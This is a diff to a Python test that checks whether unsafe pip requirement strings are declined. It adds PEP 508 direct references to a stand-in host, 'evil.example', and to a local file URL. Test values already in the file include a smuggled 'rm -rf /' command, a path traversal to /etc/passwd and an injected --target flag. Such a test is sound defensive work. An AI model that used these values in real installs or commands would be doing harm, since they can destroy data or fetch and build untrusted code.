@@ -94,6 +94,11 @@ class TestFromEventPayload:
             "../../etc/passwd",
             "requests; os.system('rm -rf /')",
             "requests --target=/tmp/evil",
+            # Direct references (PEP 508 "name @ url"): --only-binary=:all:
+            # only constrains ordinary index lookups, so pip still builds
+            # these from source (or clones a VCS repo) regardless of it.
+            "probe @ https://evil.example/x.tar.gz",
+            "probe @ file:///tmp/x",
         ],
     )
     def test_unsafe_requirement_specifiers_are_declined(self, requirement: str) -> None:
